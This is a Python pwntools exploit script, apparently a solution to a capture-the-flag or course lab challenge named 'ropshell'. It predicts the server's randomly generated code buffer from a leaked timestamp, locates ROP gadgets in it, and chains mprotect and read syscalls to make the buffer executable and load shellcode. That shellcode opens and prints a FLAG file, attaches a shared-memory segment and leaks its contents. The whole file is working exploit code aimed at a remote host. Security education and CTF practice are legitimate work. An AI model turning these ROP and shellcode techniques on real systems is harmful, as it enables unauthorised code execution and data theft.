#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import numpy as np
import struct
import ctypes
libc = ctypes.CDLL('libc.so.6')

LEN_CODE = int('0x10000', 16)*10

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell_new", shell=False)
    # pw.pause()
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)


if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

r.recvuntil(b'Timestamp is ')
t = r.recvline().strip()
print("Timestamp is :",t)



libc.srand(int(t))#1683735121

codeint = []
mask = 2 ** 32 - 1
for i in range(LEN_CODE//4) :
    codeint.append(((libc.rand() << 16  & mask) | (libc.rand() & 0xffff)))
syscall_ret = libc.rand() % (LEN_CODE//4 - 1)
codeint[syscall_ret] = 0xc3050f

byte_array = bytearray()
for interger in codeint:
    byte_array.extend(struct.pack("I", interger))  #I: unsigned int, integer, 4 bytes


r.recvuntil(b'Random bytes generated at ')
code_start_address = r.recvline().strip()
print("code atart at : ", code_start_address)
print("=========================")

def find_instruction_addr(byte_array, instr_machine_code):
    index = byte_array.find(instr_machine_code)
    addr = int(code_start_address, 16)+index
    return addr


addrrax = find_instruction_addr(byte_array, asm("pop rax;ret"))  #b'X\xc3'
addrrdi = find_instruction_addr(byte_array, asm("pop rdi;ret"))  #b'_\xc3'
addrrsi = find_instruction_addr(byte_array, asm("pop rsi;ret"))
addrrdx = find_instruction_addr(byte_array, asm("pop rdx;ret"))
addr_syscall_ret = find_instruction_addr(byte_array, asm("syscall;ret"))
addr_syscall = find_instruction_addr(byte_array, asm("syscall"))
ret = find_instruction_addr(byte_array, asm("ret"))

exit_list = [p64(addrrax), p64(60), p64(addrrdi), p64(0), p64(addr_syscall_ret)]
# PROT_READ|PROT_WRITE|PROT_EXEC  = 7  用c印出來的
sys_mprotect = [p64(addrrax), p64(10), p64(addrrdi), p64(int(code_start_address, 16)), p64(addrrsi), p64(LEN_CODE), p64(addrrdx), p64(7), p64(addr_syscall_ret)]
read = [p64(addrrax), p64(0), p64(addrrdi), p64(0), p64(addrrsi), p64(int(code_start_address, 16)), p64(addrrdx), p64(1000), p64(addr_syscall_ret)]
write = [p64(addrrax), p64(1), p64(addrrdi), p64(1), p64(addrrsi), p64(int(code_start_address, 16)), p64(addrrdx), p64(1), p64(addr_syscall_ret)]
# payload = asm("""
# mov rax, 60
# mov rdi, 0
# syscall""")

# shmget
# key : 0x1337 (spec講的)
# size : 0
# shmflg : 0

# shmat
# shmid : shmget 回傳的
# shmaddr : NULL  = 0
# shmflg  : SHM_RDONLY  = 4096

# r.send(payload)

#     section .data
# hello: db "hello, world!", 0x0a
# mlen: equ $-hello
#     section .text
# mov rax, 1
# mov rdi, 1
# mov rsi, hello
# mov rdx, mlen
# syscall

buf = b''.join(sys_mprotect+ read + [p64(int(code_start_address, 16))])
# print("send to server = ", buf)
r.send(buf)

# # print("=========================")
shellcode_readFLAG = ''
shellcode_readFLAG += shellcraft.pushstr('./FLAG').rstrip()
shellcode_readFLAG += shellcraft.open('rsp', 0, 0)
shellcode_readFLAG += shellcraft.read('rax', 'rsp', 100)  
shellcode_readFLAG += shellcraft.amd64.strlen('rsp', 'r12')
shellcode_readFLAG += shellcraft.write(1, 'rsp', 'r12')  #0x45 會多 2 bytes \x00

payload = asm("""
mov rax, 29
mov rdi, 0x1337
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax
mov rax, 30
mov rsi, 0
mov rdx, 4096
syscall
""")

shellcode_writeShm = ''             
shellcode_writeShm += shellcraft.amd64.mov('r13', 'rax', stack_allowed=False)
shellcode_writeShm += shellcraft.amd64.strlen('rax', 'rcx')
shellcode_writeShm += shellcraft.write(1, 'r13', 'rcx')
#=============================================================
# shellcode_writeShm += shellcraft.amd64.strlen('rax', 'r10')
# shellcode_writeShm += shellcraft.write(1, 'rax', 'r10')  #不行直接從 return的 rax印，因執行syscall時，rax會被改成syscall的number

shellcode_exit = shellcraft.amd64.linux.exit(0)

r.recvuntil(b'bytes command received.')
r.send(b''.join([asm(shellcode_readFLAG), payload, asm(shellcode_writeShm), asm(shellcode_exit)]))  ##read /FLAG + share memory
# r.send(b''.join([payload, asm(shellcode_writeShm), asm(shellcode_exit)]))  #read share memory only


# pipe = 0x5
# shellcode = asm(shellcraft.amd64.linux.syscall('SYS_write', pipe, 'rsp', 1))
# shellcode += asm(shellcraft.amd64.linux.syscall('SYS_exit', 0))
# r.send(shellcode)
# print(shellcode)
# print(shellcode)
# print(asm(shellcode))

# # print(sh)
# # print("=========================")
# # print(disasm(sh))

r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :